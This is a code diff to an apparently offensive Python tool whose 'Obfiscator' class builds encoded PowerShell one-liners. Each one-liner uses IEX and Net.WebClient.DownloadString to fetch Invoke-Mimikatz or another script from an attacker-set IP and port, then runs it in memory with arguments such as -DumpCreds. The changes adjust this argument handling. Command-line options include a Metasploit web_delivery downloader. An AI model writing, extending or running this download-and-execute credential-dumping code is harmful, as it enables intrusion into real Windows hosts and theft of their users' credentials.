@@ -97,13 +97,16 @@ class Obfiscator:
 
     def invoker(self):
         # Invoke Mimikatz Directly
-        text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+        text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
 
     def executor(self):
         # Invoke a PowerShell Script Directly
-        text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s -%s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
+        if "-DumpCreds" not in self.argument:
+            text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+        else:
+            text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
 
@@ -202,7 +205,7 @@ Create Pasteable Double Encoded Script:
     iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Instead of setting the IP you can extract it by interface, default eth0")
     iex_options.add_argument("-p", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
     iex_options.add_argument("-x", action="store", dest="payload", default="Invoke-Mimikatz.ps1", help="The name of the file to injected, the default is Invoke-Mimikatz.ps1")
-    iex_options.add_argument("-a", action="store", dest="mim_arg", default="DumpCreds", help="Allows you to change the argument name if you are not using the Mimikatz script, defaults to DumpCreds")
+    iex_options.add_argument("-a", action="store", dest="mim_arg", default="-DumpCreds", help="Allows you to change the argument name if you are not using the Mimikatz script, defaults to DumpCreds")
     iex_options.add_argument("-f", action="store", dest="mim_func", default="Invoke-Mimikatz", help="Allows you to change the function or cmdlet name if not using Invoke-Mimikatz, defaults to Invoke-Mimikatz")
     attack.add_argument("--invoker", action="store_true", dest="invoker", help="Configures the command to use Mimikatz invoker")
     attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
@@ -337,6 +340,8 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command, unprotected_command = x.return_command()
     if executor:
+        if "Invoke-Mimikatz.ps1" in payload or "Invoke-Mimikatz" in mim_func:
+            sys.exit("[!] You must provide at least the name tool to be injected into memory and the cmdlet name to be executed")
         execution = "executor"
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command, unprotected_command = x.return_command()
